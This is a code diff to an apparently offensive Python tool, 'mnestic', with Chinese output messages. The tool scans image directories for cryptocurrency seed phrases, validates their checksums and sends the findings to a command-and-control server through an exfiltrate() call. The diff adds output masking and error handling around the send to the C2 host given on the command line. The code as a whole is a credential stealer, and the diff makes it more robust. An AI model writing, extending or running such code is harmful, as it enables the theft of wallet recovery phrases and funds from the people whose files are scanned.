@@ -7,6 +7,7 @@ from __future__ import annotations
 
 import argparse
 import sys
+import urllib.error
 from pathlib import Path
 
 from mnestic import __version__
@@ -19,7 +20,7 @@ def _print_findings(findings, *, mask: bool) -> None:
         print("[mnestic] 未检出助记词")
         return
     for f in findings:
-        phrase = f"{f.phrase[:20]}…({f.word_count} 词)" if mask else f.phrase
+        phrase = f.masked() if mask else f.phrase
         flag = "校验和✓" if f.checksum_valid else "校验和✗"
         print(f"[mnestic] 检出 [{flag}] {f.word_count} 词: {phrase}\n          来源: {f.image}")
 
@@ -28,7 +29,11 @@ def cmd_scan(args: argparse.Namespace) -> int:
     findings = scan_directory(args.directory, db_path=args.db)
     _print_findings(findings, mask=args.mask)
     if findings and args.c2:
-        result = exfiltrate(args.c2, [f.as_dict() for f in findings])
+        try:
+            result = exfiltrate(args.c2, [f.as_dict() for f in findings])
+        except (RuntimeError, OSError, urllib.error.URLError) as exc:
+            print(f"[mnestic] 回传失败: {exc}", file=sys.stderr)
+            return 3
         print(f"[mnestic] 已回传 {result.get('count', 0)} 条到 C2 {args.c2}")
     return 1 if any(f.checksum_valid for f in findings) else 0
 
